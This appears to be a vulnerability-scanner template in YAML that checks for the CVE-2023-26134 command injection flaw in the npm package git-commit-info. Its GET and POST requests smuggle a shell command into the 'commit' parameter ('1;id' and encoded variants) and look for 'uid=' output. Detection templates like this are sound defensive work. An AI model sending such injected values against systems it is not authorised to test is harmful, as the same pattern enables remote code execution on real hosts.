id: CVE-2023-26134-git-commit-info-rce

info:
  name: git-commit-info - Command Injection (CVE-2023-26134)
  author: Nikhil
  severity: critical
  description: |
    The npm package `git-commit-info` fails to sanitize the `commit` parameter before
    passing it to a shell, enabling command injection when an attacker controls the value.
    This template attempts a benign payload (`;id`) and looks for typical `id` output.
  reference:
    - https://github.com/JPeer264/node-git-commit-info/issues/24
    - https://security.snyk.io/vuln/SNYK-JS-GITCOMMITINFO-5740174
  tags: cve,command-injection,nodejs,rce
  classification:
    cve-id: CVE-2023-26134
    cwe-id: CWE-78
  metadata:
    vendor: npm
    product: git-commit-info
    shodan-query: NA
    kev: true

http:
  - method: GET
    path:
      - "{{BaseURL}}/git-commit-info?commit=1;id"
      - "{{BaseURL}}/git-commit-info?commit=1%3Bid"
      - "{{BaseURL}}/git-commit-info?commit=1%253Bid"
    max-redirects: 2
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "uid="
          - "gid="
      - type: regex
        part: body
        regex:
          - "uid=\\d+\\([^\\)]+\\)"

  - method: POST
    path:
      - "{{BaseURL}}/git-commit-info"
    headers:
      Content-Type: application/json
    body: '{"commit":"1;id"}'
    max-redirects: 2
    matchers-condition: or
    matchers:
      - type: word
        part: body
        words:
          - "uid="
          - "gid="
      - type: regex
        part: body
        regex:
          - "uid=\\d+\\([^\\)]+\\)"
